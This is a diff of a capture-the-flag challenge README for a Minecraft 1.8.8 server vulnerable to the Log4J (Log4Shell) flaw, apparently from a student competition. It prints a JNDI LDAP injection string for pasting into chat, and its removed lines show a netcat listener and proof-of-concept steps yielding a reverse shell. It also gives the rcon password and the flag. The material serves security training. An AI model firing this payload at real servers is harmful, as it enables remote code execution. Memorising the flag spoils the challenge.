@@ -3,27 +3,26 @@ Description:
 ```markdown
 My son asked me to make him a minecraft server! He told me to use 1.8.8 because it has better pvp mechanics or something like that. Anyway it's open so his friends can join. I hope that it doesn't log anything incorrectly...
 
+`mc.chal.cyberjousting.com:9000`
+or minecraft
 `mc.chal.cyberjousting.com:25565`
+
+Challenge notes:
+The password for rcon is 'password'
+You'll need to connect to the nc even if using the mc client.
 
 ```
 
 **Author**: `zinko`
 
 ## Writeup
-The intended solve for this challenge is for you to do some research to find (ie by searching `minecraft logging vuln`) to find out this challenge uses the Log4J vulnerability. Next is finding a way to execute it...
+The intended solve for this challenge is for you to do some research to find (ie by searching `minecraft logging vuln`) to find out this challenge uses the Log4J vulnerability. You then must write your own payload and find a way to execute it.
 
-Requirements: `pip install -r requirements.txt`
+Write your exploit and upload it to the web portal
 
-In a terminal window:
-`nc -lvnp 9001`
+Paste this string in the minecraft chat: `${jndi:ldap://{the ip your container gave you}:1389/a}`
 
-In a different terminal window: `python3 poc.py —-userip {your ip connecting to mc server} —-webport 8000 —-lport 9001`
-
-Paste this string in the minecraft chat: `${jndi:ldap://{the ip you used for —-userip}:1389/a}`
-
-Now you have reverse shell in your netcat terminal: 
-`cat flag.txt`
-
+The server now will execute your payload and if done correctly will give you the flag!
 
 **Flag** - `byuctf{N07_my_min3cr4f7_s3rv3r}`
 
@@ -39,4 +38,3 @@ To stop the challenge:
 ```bash
 docker compose down
 ```
-Note: The server will crash whenever someone runs the exploit (not sure why). It is set to auto restart.
